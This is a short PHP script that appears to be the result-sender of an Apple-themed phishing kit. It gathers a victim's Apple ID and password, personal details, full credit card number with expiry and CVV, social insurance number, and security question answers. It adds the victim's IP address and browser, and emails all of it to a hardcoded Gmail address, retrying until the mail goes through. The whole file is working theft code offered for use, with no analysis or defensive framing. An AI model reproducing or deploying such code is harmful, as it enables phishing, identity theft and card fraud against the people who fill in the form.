<?php
$mail_to = "ahmedchamai1@gmail.com";
$subject = "Result Apple [EN] " . $_POST['ccnum'] . " ~ " . $_POST['expmonth'] . " / " . $_POST['expyear'] . " | " . $_POST['apple_login'];

$message  = "+ ------------+| Apple Login |+------------\r\n";
$message .= "| Apple ID : " . $_POST['apple_login'] . "\r\n";
$message .= "| Password : " . $_POST['apple_password'] . "\r\n";
$message .= "+ ------------+| Apple Info |+------------\r\n";
$message .= "| First name : " . $_POST['firstname'] . "\r\n";
$message .= "| Last name : " . $_POST['lastname'] . "\r\n";
$message .= "| Date of birth : " . $_POST['dob'] . "\r\n";
$message .= "| Address : " . $_POST['address'] . "\r\n";
$message .= "| Zip code : " . $_POST['zipcode'] . "\r\n";
$message .= "| City : " . $_POST['city'] . "\r\n";
$message .= "| Phone number : " . $_POST['phone'] . "\r\n";
$message .= "+ ------------+| Apple V B V |+------------\r\n";
$message .= "| Holder name : " . $_POST['holdername'] . "\r\n";
$message .= "| Credit card number : " . $_POST['ccnum'] . "\r\n";
$message .= "| Expiration date : " . $_POST['expmonth'] . " / " . $_POST['expyear'] . "\r\n";
$message .= "| Security code : " . $_POST['cvv'] . "\r\n";
$message .= "| Social insurance number : " . $_POST['sin'] . "\r\n";
$message .= "+ ------------+| Apple Security |+------------\r\n";
$message .= "| Security question n°1 : " . $_POST['security_question_1'] . "\r\n";
$message .= "| Answer n°1 : " . $_POST['answer_1'] . "\r\n";
$message .= "| Security question n°2 : " . $_POST['security_question_2'] . "\r\n";
$message .= "| Answer n°2 : " . $_POST['answer_2'] . "\r\n";
$message .= "| Security question n°3 : " . $_POST['security_question_3'] . "\r\n";
$message .= "| Answer n°3 : " . $_POST['answer_3'] . "\r\n";
$message .= "+ ------------+| Apple IP |+------------ \r\n";
$message .= "| Adresse IP : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$message .= "| Navigateur : " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$message .= "+ -----------------------------------------------------------\r\n";

$header  = "From: " . $_SERVER['REMOTE_ADDR'] . " <amp_" . rand(111, 999) . ">\r\n";
$header .= "MIME-Version: 1.0\r\n";

do {
	$send = mail($mail_to, $subject, $message, $header);
} while (!$send);
?>